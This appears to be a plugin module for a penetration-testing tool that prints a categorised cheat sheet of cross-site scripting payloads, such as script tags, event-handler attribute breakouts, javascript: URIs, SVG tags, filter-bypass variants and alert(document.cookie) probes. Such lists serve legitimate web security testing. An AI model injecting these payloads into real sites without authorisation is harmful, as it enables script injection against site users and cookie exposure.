PROVIDES = []
REQUIRES = []

# =========================================================
# COLORS
# =========================================================

G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
W = "\033[0m"
BOLD = "\033[1m"

# =========================================================
# PAYLOADS
# =========================================================

PAYLOADS = {

    "Basic": [

        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)></iframe>",

    ],

    "Attribute Injection": [

        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        "onclick=alert(1)",

    ],

    "Input Breakout": [

        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"></textarea><script>alert(1)</script>",
        "'></textarea><script>alert(1)</script>",

    ],

    "JavaScript URI": [

        "javascript:alert(1)",
        "<a href=javascript:alert(1)>CLICK</a>",
        "<form action=javascript:alert(1)>",

    ],

    "SVG": [

        "<svg/onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",

    ],

    "HTML Injection": [

        "<h1>TEST</h1>",
        "<b>TEST</b>",
        "<i>TEST</i>",
        "<marquee>TEST</marquee>",

    ],

    "Filter Bypass": [

        "<img src=x onerror=confirm(1)>",
        "<img src=x onerror=prompt(1)>",
        "<svg/onload=confirm(1)>",
        "<svg/onload=prompt(1)>",

    ],

    "Information": [

        "<script>alert(document.cookie)</script>",
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=alert(document.domain)>",

    ],

}

# =========================================================
# MAIN
# =========================================================

def run(data, cred, args):

    print()

    print(
        f"{B}┌── {BOLD}COMMON XSS PAYLOADS{W}{B} ─────────────────────┐{W}"
    )

    print(
        f"{B}└──────────────────────────────────────────────────┘{W}"
    )

    print()

    for category, payloads in PAYLOADS.items():

        print(
            f"{G}[*] {category}{W}\n"
        )

        for payload in payloads:

            print(
                f"  {C}{payload}{W}"
            )

        print()

    return data
